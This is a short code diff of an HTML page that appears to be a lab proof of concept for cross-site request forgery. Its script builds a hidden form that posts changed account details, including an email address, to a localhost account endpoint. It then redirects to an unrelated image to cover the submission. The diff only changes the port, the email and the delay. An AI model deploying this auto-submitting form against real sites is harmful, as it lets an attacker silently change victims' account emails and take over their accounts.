@@ -10,12 +10,12 @@
         const data = {
             first_name: "John", 
             last_name: "Doe", 
-            email: "attackerEmail@gmail.com",
+            email: "csrf@gmail.com",
             phone: "0987654321", 
             address: "123 Main St, Springfield"
         };
         const form = document.createElement("form"); form.method = "POST";
-        form.action = "http://localhost:3000/account";
+        form.action = "http://localhost:4000/account";
         form.style.display = "none";
         for (const key in data) {
             const input = document.createElement('input');
@@ -27,7 +27,7 @@
         document.body.appendChild(form); form.submit();
         setTimeout(() => {
             window.location = "https://i.natgeofe.com/n/548467d8-c5f1-4551-9f58-6817a8d2c45e/NationalGeographic_2572187.jpg?w=718&h=479"
-        }, 50)
+        }, 200)
     </script>
 </body>
 </html>
